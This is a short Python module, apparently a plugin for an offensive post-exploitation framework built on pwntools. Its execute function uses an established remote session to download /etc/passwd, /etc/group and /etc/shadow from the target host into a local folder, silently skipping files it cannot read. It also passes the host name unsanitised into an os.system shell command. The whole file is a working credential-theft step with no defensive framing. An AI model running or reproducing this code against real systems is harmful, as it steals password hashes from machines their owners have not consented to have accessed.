#!/usr/bin/python3

from pwn import *
import misc.coloredstatus as cs
from time import sleep
import os

def execute(session, configs, params):

    def download(remote, local):
        try:
            session.download_file(remote, download_dir + local)
        except PermissionError:
            pass

    download_dir = configs["DownloadDirectory"] + session.host + "/"
    os.system("mkdir -p " + download_dir)
         
    try:
        download("/etc/passwd", "passwd")
        download("/etc/group", "group")
        download("/etc/shadow", "shadow")
        
        return 0
    except:
        return 2
